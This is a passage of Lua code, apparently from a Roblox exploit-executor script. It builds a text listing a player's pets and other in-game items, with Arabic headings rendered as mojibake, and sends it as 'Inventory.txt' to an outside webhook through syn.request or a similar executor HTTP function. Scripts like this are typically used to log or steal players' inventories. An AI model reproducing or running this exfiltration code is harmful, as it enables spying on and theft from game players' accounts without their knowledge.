content = content.."\nðŸ¶ Ø§Ù„Ø­ÙŠÙˆØ§Ù†Ø§Øª:\n"
for i,v in ipairs(pets) do content = content.."- "..v.."\n" end
content = content.."\nðŸ“¦ Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ø£Ø®Ø±Ù‰:\n"
for i,v in ipairs(otherItems) do content = content.."- "..v.."\n" end

local requestFunc = syn and syn.request or http_request or request  
if requestFunc then  
    requestFunc({  
        Url = WEBHOOK_URL,  
        Method = "POST",  
        Headers = {["Content-Type"]="multipart/form-data; boundary=---011000010111000001101001"},  
        Body = table.concat({  
            "-----011000010111000001101001",  
            'Content-Disposition: form-data; name="file"; filename="Inventory.txt"',  
            "Content-Type: text/plain",  
            "",  
            content,  
            "-----011000010111000001101001--"  
        },"\r\n")  
    })  
end

end

